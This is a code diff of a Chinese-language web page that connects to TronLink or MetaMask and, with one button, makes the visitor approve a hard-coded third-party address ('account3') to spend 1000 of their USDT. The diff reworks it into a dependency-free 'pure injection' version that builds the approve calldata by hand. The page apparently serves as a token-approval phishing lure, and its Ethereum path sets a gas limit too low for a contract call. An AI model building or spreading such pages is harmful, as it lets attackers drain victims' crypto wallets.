@@ -2,7 +2,7 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8" />
-  <title>跨链授权 USDT（DApp 安全版）</title>
+  <title>跨链授权 USDT（纯注入版）</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -46,8 +46,8 @@
 </head>
 <body>
   <div class="container">
-    <h2>🔐 跨链授权 USDT</h2>
-    <p>支持 MetaMask（ETH）和 TronLink（TRON）</p>
+    <h2>🔐 跨链授权 USDT（无依赖版）</h2>
+    <p>支持 TronLink（TRON）和 MetaMask（ETH）</p>
 
     <button id="connect">连接钱包</button>
     <div id="accountInfo"></div>
@@ -56,12 +56,9 @@
     <div id="result"></div>
   </div>
 
-  <!-- 只引入 ethers.js（用于 parseUnits 等工具函数） -->
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-
   <script>
     // ===================
-    // 配置（请按需修改 account3）
+    // 配置（请替换 account3 为你的真实地址）
     // ===================
     const CONFIG = {
       ethereum: {
@@ -77,28 +74,16 @@
     };
 
     let currentChain = null;
-    let signerOrTronWeb = null;
 
     // ===================
-    // 工具：等待钱包注入完成
+    // 工具：将 "1000" 转为带精度的字符串（如 "1000000000"）
     // ===================
-    function waitForProvider(providerName, timeout = 3000) {
-      return new Promise((resolve) => {
-        if (window[providerName]) {
-          resolve(window[providerName]);
-          return;
-        }
-        const start = Date.now();
-        const check = setInterval(() => {
-          if (window[providerName]) {
-            clearInterval(check);
-            resolve(window[providerName]);
-          } else if (Date.now() - start > timeout) {
-            clearInterval(check);
-            resolve(null);
-          }
-        }, 100);
-      });
+    function toTokenAmount(valueStr, decimals) {
+      const [whole, fraction = ''] = valueStr.split('.');
+      const padFraction = fraction.padEnd(decimals, '0').slice(0, decimals);
+      const result = whole + padFraction;
+      // 移除前导零（但保留至少一个 0）
+      return result.replace(/^0+(?=\d)/, '') || '0';
     }
 
     // ===================
@@ -108,24 +93,23 @@
       const resultDiv = document.getElementById("result");
       resultDiv.innerHTML = "";
 
-      // 1. 等待 TronLink
-      const tronWeb = await waitForProvider('tronWeb');
-      if (tronWeb && tronWeb.ready) {
+      // 检查 TronLink
+      if (window.tronWeb && window.tronWeb.ready) {
         currentChain = 'tron';
-        signerOrTronWeb = tronWeb;
         await handleTronConnect();
         return;
       }
 
-      // 2. 等待 MetaMask
-      const ethereum = await waitForProvider('ethereum');
-      if (ethereum) {
+      // 检查 MetaMask
+      if (window.ethereum) {
         currentChain = 'ethereum';
         try {
-          const provider = new ethers.providers.Web3Provider(ethereum);
-          await provider.send("eth_requestAccounts", []);
-          signerOrTronWeb = provider.getSigner();
-          await handleEthConnect();
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const addr = accounts[0];
+          document.getElementById("accountInfo").innerHTML = `<div class="info">✅ ETH 账户：${addr}</div>`;
+          document.getElementById("chainInfo").innerHTML = `<div class="info">🌐 网络：Ethereum</div>`;
+          document.getElementById("approve").disabled = false;
+          resultDiv.innerHTML = `<div class="info">✅ 已连接，可授权 USDT</div>`;
           return;
         } catch (err) {
           resultDiv.innerHTML = `<div class="error">MetaMask 授权被拒绝</div>`;
@@ -136,22 +120,10 @@
       resultDiv.innerHTML = `<div class="error">未检测到钱包。请在 TronLink 或 MetaMask 中打开此页面。</div>`;
     };
 
-    async function handleEthConnect() {
-      try {
-        const addr = await signerOrTronWeb.getAddress();
-        document.getElementById("accountInfo").innerHTML = `<div class="info">✅ ETH 账户：${addr}</div>`;
-        document.getElementById("chainInfo").innerHTML = `<div class="info">🌐 网络：Ethereum</div>`;
-        document.getElementById("approve").disabled = false;
-        document.getElementById("result").innerHTML = `<div class="info">✅ 已连接，可授权 USDT</div>`;
-      } catch (err) {
-        document.getElementById("result").innerHTML = `<div class="error">ETH 连接失败：${err.message}</div>`;
-      }
-    }
-
     async function handleTronConnect() {
       try {
         // ✅ 主动请求账户（TronLink 官方要求）
-        const accounts = await signerOrTronWeb.request({ method: 'tron_requestAccounts' });
+        const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
         const addr = accounts[0];
 
         document.getElementById("accountInfo").innerHTML = `<div class="info">✅ TRON 账户：${addr}</div>`;
@@ -165,36 +137,46 @@
     }
 
     // ===================
-    // 授权操作
+    // 授权操作（无 ethers 依赖）
     // ===================
     document.getElementById("approve").onclick = async () => {
       const cfg = CONFIG[currentChain];
-      const amountStr = "1000";
-      let tx;
+      const amountStr = "1000"; // 授权数量
+      let txHash;
 
       try {
         if (currentChain === 'ethereum') {
-          const amount = ethers.utils.parseUnits(amountStr, cfg.decimals);
-          const contract = new ethers.Contract(
-            cfg.token,
-            ["function approve(address,uint256) external returns (bool)"],
-            signerOrTronWeb
-          );
-          tx = await contract.approve(cfg.account3, amount);
-          await tx.wait();
+          // 构造 approve 交易数据（标准 ERC20 ABI）
+          const amountHex = "0x" + BigInt(toTokenAmount(amountStr, cfg.decimals)).toString(16);
+          const data = "0x095ea7b3" + // approve 方法 selector
+                       cfg.account3.replace('0x', '').padStart(64, '0') +
+                       amountHex.replace('0x', '').padStart(64, '0');
+
+          const tx = {
+            from: (await window.ethereum.request({ method: 'eth_accounts' }))[0],
+            to: cfg.token,
+            data: data,
+            gasLimit: "0x5208", // 21000 最小值，实际可能需要更高
+          };
+
+          txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [tx]
+          });
         } else {
-          // TRON: 使用 ethers 处理精度，再转字符串
-          const amount = ethers.utils.parseUnits(amountStr, cfg.decimals).toString();
-          const contract = await signerOrTronWeb.contract().at(cfg.token);
-          tx = await contract.approve(cfg.account3, amount).send({
+          // TRON: 使用原生 tronWeb
+          const amount = toTokenAmount(amountStr, cfg.decimals);
+          const contract = await window.tronWeb.contract().at(cfg.token);
+          const tx = await contract.approve(cfg.account3, amount).send({
             feeLimit: 100_000_000
           });
+          txHash = tx.transaction; // TronWeb 返回对象
         }
 
-        document.getElementById("result").innerHTML = `<div class="info">✅ 授权成功！<br>交易 ID: ${tx.transaction ? tx.transaction : tx}</div>`;
+        document.getElementById("result").innerHTML = `<div class="info">✅ 授权成功！<br>交易 ID: ${txHash}</div>`;
       } catch (err) {
         console.error("授权失败", err);
-        let msg = err.reason || err.message || String(err);
+        let msg = err.message || String(err);
         if (msg.includes("user denied") || msg.includes("User denied")) {
           msg = "用户取消了交易";
         }
